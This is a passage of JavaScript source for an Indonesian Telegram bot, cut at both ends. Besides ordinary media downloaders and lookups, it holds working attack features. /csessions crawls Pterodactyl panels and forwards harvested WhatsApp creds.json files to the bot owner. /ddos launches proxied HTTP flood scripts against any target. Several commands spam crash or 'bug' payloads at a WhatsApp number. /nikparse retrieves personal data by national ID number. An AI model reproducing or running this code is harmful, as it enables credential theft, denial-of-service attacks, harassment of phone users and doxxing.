    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><b> ⬡═―—⊱ ⎧ FAULET XBLAUD ⎭ ⊰―—═⬡ </b></blockquote>
𖤓 IP: ${data.ip || "-"}
𖤓 Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
𖤓 Region: ${data.region || "-"}
𖤓 City: ${data.city || "-"}
𖤓 ZIP: ${data.postal || "-"}
𖤓 Timezone: ${data.timezone_gmt || "-"}
𖤓 ISP: ${data.isp || "-"}
𖤓 Org: ${data.org || "-"}
𖤓 ASN: ${data.asn || "-"}
𖤓 Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

// Command /cekid
bot.command("cekid", async (ctx) => {
    const chatId = ctx.chat.id;
    
    try {
        // Ambil teks setelah command
        const text = ctx.message.text.split(" ").slice(1).join(" ");
        
        if (!text) {
            return ctx.reply("⚠ Gunakan: /cekid https://whatsapp.com/channel/xxxx");
        }

        if (!text.includes("whatsapp.com/channel/")) {
            return ctx.reply("❌ Link WhatsApp Channel tidak valid!");
        }

        let channelId = text.split("channel/")[1].split(/[/?]/)[0];
        let newsletterJid = channelId + "@newsletter";

        await ctx.reply(
`✅ Newsletter ID ditemukan:

${newsletterJid}`
        );

    } catch (err) {
        console.log(err);
        ctx.reply("Terjadi error saat proses.");
    }
});

bot.command("tiktok", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /tiktok https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  // Validasi URL TikTok
  if (!url.match(/(tiktok\.com|vt\.tiktok\.com)/)) {
    return ctx.reply("❌ Link TikTok tidak valid!");
  }

  // Kirim pesan dengan button
  await ctx.reply(
    "📥 Pilih jenis download yang diinginkan:",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🎬 Video + Audio", callback_data: `tiktok_download|${url}|video` },
            { text: "🌟 HD (No Watermark)", callback_data: `tiktok_download|${url}|hd` }
          ],
          [
            { text: "🎵 Audio Saja", callback_data: `tiktok_download|${url}|audio` }
          ]
        ]
      }
    }
  );
});


// Fungsi download TikTok dengan berbagai tipe
async function downloadTikTok(url, type = 'video') {
  try {
    // Step 1: Ambil data video dari API
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data) {
      return { success: false, error: "Gagal ambil data video" };
    }

    const videoData = data.data;
    
    // Step 2: Pilih URL berdasarkan tipe
    let downloadUrl;
    
    if (type === 'audio') {
      // Ambil audio saja
      downloadUrl = videoData.music || videoData.music_info?.play_url;
      if (!downloadUrl) {
        return { success: false, error: "Audio tidak tersedia" };
      }
    } else if (type === 'hd') {
      // Prioritaskan video tanpa watermark (HD)
      downloadUrl = videoData.play || videoData.hdplay;
    } else {
      // Video standar (biasanya dengan watermark)
      downloadUrl = videoData.play || videoData.wmplay || videoData.hdplay;
    }

    if (!downloadUrl) {
      return { success: false, error: "URL download tidak ditemukan" };
    }
    const response = await axios.get(downloadUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    if (type === 'audio' && !downloadUrl.includes('.mp3')) {
    }

    return { 
      success: true, 
      data: response.data,
      type: type,
      size: response.data.length
    };

  } catch (error) {
    console.error("Download error:", error);
    return { 
      success: false, 
      error: error.response?.status 
        ? `Error ${error.response.status}`
        : "Koneksi timeout atau link salah"
    };
  }
}

// Helper function untuk nama tipe
function getTypeName(type) {
  const names = {
    'video': 'Video + Audio',
    'hd': 'HD No Watermark',
    'audio': 'Audio Saja'
  };
  return names[type] || type;
}

async function downloadFromAlternateAPI(url, type) {
  const apis = [
    "https://api.tikmate.app/api/lookup",
    "https://www.tikwm.com/api/"
  ];
  
  for (const api of apis) {
    try {
    } catch (error) {
      continue;
    }
  }
  
  throw new Error("Semua API gagal");
}

bot.command("igdl", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 Format: /igdl https://www.instagram.com/p/Cxample123/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ ☇ Sedang memproses video Instagram");

  try {
    // Alternative API - Instagram Downloader
    const { data } = await axios.get("https://api.igdownloader.com/api/ig", {
      params: { url },
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36",
        "accept": "application/json,text/plain,*/*"
      },
      timeout: 20000
    });

    if (!data || data.error) {
      return ctx.reply("❌ ☇ Gagal ambil data video pastikan link valid dan publik");
    }

    const mediaUrl = data.result?.url || data.result;
    
    if (!mediaUrl) {
      return ctx.reply("❌ ☇ Tidak ada media yang bisa diunduh");
    }

    // Download media
    const media = await axios.get(mediaUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent": "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/123 Safari/537.36"
      },
      timeout: 30000
    });

    // Cek tipe media dari Content-Type
    const contentType = media.headers['content-type'];
    const isVideo = contentType && contentType.startsWith('video');

    if (isVideo) {
      await ctx.replyWithVideo(
        { source: Buffer.from(media.data), filename: `ig_${Date.now()}.mp4` },
        { 
          supports_streaming: true,
          caption: "✅ Video Instagram berhasil didownload"
        }
      );
    } else {
      await ctx.replyWithPhoto(
        { source: Buffer.from(media.data) },
        { caption: "📷 Foto Instagram berhasil didownload" }
      );
    }

  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ ☇ Error ${e.response.status} saat mengunduh media`
        : "❌ ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("nikparse", checkPremium, async (ctx) => {
  const nik = ctx.message.text.split(" ").slice(1).join("").trim();
  if (!nik) return ctx.reply("🪧 Format: /nikparse 1234567890283625");
  if (!/^\d{16}$/.test(nik)) return ctx.reply("❌ ☇ NIK harus 16 digit angka");

  const wait = await ctx.reply("⏳ ☇ Sedang memproses pengecekan NIK");

const replyHTML = (d) => {
  const get = (x) => (x ?? "-");

  const caption =`
<blockquote><b> ⬡═―—⊱ ⎧ FAULET XBLAUD ⎭ ⊰―—═⬡ </b></blockquote>
𖤓 NIK: ${get(d.nik) || nik}
𖤓 Nama: ${get(d.nama)}
𖤓 Jenis Kelamin: ${get(d.jenis_kelamin || d.gender)}
𖤓 Tempat Lahir: ${get(d.tempat_lahir || d.tempat)}
𖤓 Tanggal Lahir: ${get(d.tanggal_lahir || d.tgl_lahir)}
𖤓 Umur: ${get(d.umur)}
𖤓 Provinsi: ${get(d.provinsi || d.province)}
𖤓 Kabupaten/Kota: ${get(d.kabupaten || d.kota || d.regency)}
𖤓 Kecamatan: ${get(d.kecamatan || d.district)}
𖤓 Kelurahan/Desa: ${get(d.kelurahan || d.village)}
`;

  return ctx.reply(caption, { parse_mode: "HTML", disable_web_page_preview: true });
};

  try {
    const a1 = await axios.get(
      `https://api.akuari.my.id/national/nik?nik=${nik}`,
      { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
    );

    if (a1?.data?.status && a1?.data?.result) {
      await replyHTML(a1.data.result);
    } else {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ NIK tidak ditemukan");
      }
    }
  } catch (e) {
    try {
      const a2 = await axios.get(
        `https://api.nikparser.com/nik/${nik}`,
        { headers: { "user-agent": "Mozilla/5.0" }, timeout: 15000 }
      );
      if (a2?.data) {
        await replyHTML(a2.data);
      } else {
        await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
      }
    } catch {
      await ctx.reply("❌ ☇ Gagal menghubungi api, Coba lagi nanti");
    }
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});



bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("🪧 ☇ Format: /csessions https://domainpanel.com,ptla_123,ptlc_123");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("🪧 ☇ Format: /csessions https://panelku.com,plta_123,pltc_123");

  await ctx.reply(
    "⏳ ☇ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ ☇ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 ☇ Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(ownerID, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ ☇ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ ☇ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ ☇ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ ☇ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ ☇ Terjadi error saat scan");
  }
});


bot.command("toblur", async (ctx) => {
  const reply = ctx.message.reply_to_message;
  if (!reply || !reply.photo)
    return ctx.reply("❌ Reply ke foto dulu!");

  try {
    const loading = await ctx.reply("⏳ Memproses blur...");

    const photo = reply.photo.at(-1);
    const fileLink = await ctx.telegram.getFileLink(photo.file_id);

    await ctx.telegram.editMessageText(ctx.chat.id, loading.message_id, null, "✅ Blur selesai, mengirim foto...");
    await ctx.replyWithPhoto({ url: `https://ikyyzyyrestapi.my.id/image/blur?url=${encodeURIComponent(fileLink.href)}` });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal memproses foto!");
  }
});

bot.command(["id"], async (ctx) => {
  try {
    let targetUser = null;
    let replyMsg = ctx.message.reply_to_message;
    
    // CEK APAKAH ADA YANG DI-REPLY
    if (replyMsg) {
      targetUser = replyMsg.from;
    } else {
      // CEK APAKAH ADA USERNAME YANG DIKASIH
      const args = ctx.message.text.split(" ");
      if (args.length > 1) {
        let username = args[1].replace("@", "");
        try {
          targetUser = await ctx.telegram.getChat(`@${username}`);
        } catch (e) {
          return ctx.reply(`❌ Username @${username} tidak ditemukan!`);
        }
      } else {
        // TARGET DIRI SENDIRI
        targetUser = ctx.from;
      }
    }
    
    // TAMPILKAN ID
    await ctx.reply(`
🆔 *ID TELEGRAM*

👤 *Nama:* ${targetUser.first_name || "-"} ${targetUser.last_name || ""}
📛 *Username:* ${targetUser.username ? `@${targetUser.username}` : "-"}
🔢 *User ID:* \`${targetUser.id}\`

${targetUser.id ? `📋 *Klik ID untuk copy:* \`${targetUser.id}\`` : ""}
    `, { 
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "📋 COPY ID", copy_text: { text: String(targetUser.id) }, style: "Primary" }
          ]
        ]
      }  
    });
    
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi kesalahan. Pastikan username valid!");
  }
});

bot.command("convert", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("🪧 ☇ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke catbox`
      : "❌ ☇ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

function loadBotnetData() {
    try {
        return JSON.parse(fs.readFileSync('./ddos/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        return { endpoints: [] };
    }
}

// Fungsi untuk menyimpan data botnet ke file JSON
function saveBotnetData(botnetData) {
    try {
        fs.writeFileSync('./ddos/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
}

//------------------ TOOLS DDOS -------------//
bot.command('ddos', checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;

  const input = ctx.message.text.substring(6).trim().split(/\s+/); 

  const target = input[0];
  const time = input[1];
  const methods = input[2];

  if (!target || !time || !methods) {
    return ctx.reply(
      "Contoh Penggunaan:\n/ddos https://example.com 60 pidoras",
      { parse_mode: "HTML" }
    );
  }
await ctx.telegram.sendPhoto(ctx.chat.id, attackUrl, {
    caption: `
<blockquote>( 👑 ) -# 𝙵𝙻𝙰𝚄𝚃𝙴 𝚇𝙱𝙻𝙰𝚄𝙳</blockquote>
𖤓 Target: ${target}
𖤓 Time: ${time}
𖤓 Metode: ${methods}`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check Target", url: `https://check-host.net/check-http?host=${target}` }
      ]]
    }
  });

  if (methods === "strike") {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
  } else if (methods === "mix") {
    exec(`node ./methods/strike.js GET ${target} ${time} 4 90 proxy.txt --full`);
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "flood") {
    exec(`node methods/flood.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "h2vip") {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else if (methods === "h2") {
    exec(`node methods/H2F3.js ${target} ${time} 500 10 proxy.txt`);
  } else if (methods === "pidoras") {
    exec(`node methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
  } else {
    ctx.reply("❌ Metode tidak dikenali atau format salah.");
  }
});
//--------------COMMANDanjing --------------//
bot.command("crasher", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre>⿻νσι∂ ¢яαѕнєя⿻ 

payload
◉ Target: ${number}
◉ Type: ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
 νσι∂ ¢яαѕнєя</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: [
      [
        {
          text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
          url: `https://wa.me/${number}`, style: "primary"
        },
        {
          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/Razzxyubot", style: "danger"
        }
      ]
    ]
  }
});

  const speed = 5;                
  const initialDelay = 0;      

  for (let i = 0; i < 370; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await lockchat(sock, target);
    await lockchat(sock, target);
    await lockchat(sock, target);
  }
});

bot.command("exitdelay", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre>⿻νσι∂ ¢яαѕнєя⿻ 

payload
◉ Target: ${number}
◉ Type: ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
 νσι∂ ¢яαѕнєя</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: [
      [
        {
          text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
          url: `https://wa.me/${number}`, style: "primary"
        },
        {
          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/Razzxyubot", style: "danger"
        }
      ]
    ]
  }
});

  const speed = 5;                
  const initialDelay = 0;      

  for (let i = 0; i < 399; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await ArTDelay(sock, target);
    await ArTDelay(sock, target);
    await ArTDelay(sock, target);
  }
});

bot.command("voiddelay", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre>⿻νσι∂ ¢яαѕнєя⿻ 

payload
◉ Target: ${number}
◉ Type: ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
 νσι∂ ¢яαѕнєя</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: [
      [
        {
          text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
          url: `https://wa.me/${number}`, style: "primary"
        },
        {
          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/Razzxyubot", style: "danger"
        }
      ]
    ]
  }
});

  const speed = 5;                
  const initialDelay = 0;      

  for (let i = 0; i < 5; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await invisibledelay(sock, target);
    await invisibledelay(sock, target);
    await invisibledelay(sock, target);
  }
});

bot.command("razzxy", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre>⿻νσι∂ ¢яαѕнєя⿻ 

payload
◉ Target: ${number}
◉ Type: ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
 νσι∂ ¢яαѕнєя</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: [
      [
        {
          text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
          url: `https://wa.me/${number}`, style: "primary"
        },
        {
          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/Razzxyubot", style: "danger"
        }
      ]
    ]
  }
});

  const speed = 7;                
  const initialDelay = 5000;      

  for (let i = 0; i < 70; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await gokil(sock, target);
    await gokil(sock, target);
  }
});

bot.command("Scrot", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre>⿻νσι∂ ¢яαѕнєя⿻ 

payload
◉ Target: ${number}
◉ Type: ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
 νσι∂ ¢яαѕнєя</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: [
      [
        {
          text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
          url: `https://wa.me/${number}`, style: "primary"
        },
        {
          text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
          url: "https://t.me/Razzxyubot", style: "danger"
        }
      ]
    ]
  }
});

  const speed = 4;                
  const initialDelay = 0;      

  for (let i = 0; i < 310; i++) {
    await new Promise(res => setTimeout(res, initialDelay));
    await FrezeChat(sock, target);
    await FrezeChat(sock, target);
    await FrezeChat(sock, target);
  }
});

bot.command("Xcoli", checkWhatsAppConnection, checkJoinChannel, checkPremium, checkCooldown, async (ctx) => {
  let number = ctx.message.text.split(" ")[1];
  if (!number) return ctx.reply(`🪧 ☇ Format: /xspam 62×××`);
  let target = number.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  let potentialColor = "🟢"

  // SEND FOTO 1 KALI DOANG, TANPA EDIT
  await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<pre>⿻νσι∂ ¢яαѕнєя⿻ 

payload
◉ Target: ${number}
◉ Type: ɴᴏ ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ
◉ username: @${ctx.from.username || ctx.from.first_name}
◉ Status : sᴜᴋsᴇs
────────────────────
 νσι∂ ¢яαѕнєя</pre>
`,
    parse_mode: "HTML",
    reply_markup: {
    inline_keyboard: [
      [
        {
          text: "ᴄᴇᴋ ꜱɪ ᴀᴍᴘᴀꜱ",
          url: `https://wa.me/${number}`, style: "primary"
        },
        {
